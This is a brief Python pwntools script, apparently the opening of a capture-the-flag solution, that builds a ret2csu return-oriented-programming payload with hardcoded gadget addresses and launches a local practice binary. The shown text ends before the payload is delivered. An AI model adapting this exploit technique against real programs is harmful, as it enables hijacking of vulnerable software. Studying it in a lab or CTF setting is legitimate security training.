from pwn import*
context.arch = 'amd64'
context.log_level = 'debug'
def pr(a,addr):
    log.success(a+'====>'+hex(addr))

def csu(arg1,arg2,arg3,func,retfun):
    mmmc = 0x400730
    pop6_ret = 0x40074a
    payload = p64(pop6_ret)
    payload += p64(0)+p64(1)+p64(func)+p64(arg1)+p64(arg2)+p64(arg3)
    payload += p64(mmmc)+'a'*56
    payload += p64(retfun)
    return payload

p = process('./ret2csu')
elf = ELF('./ret2csu')
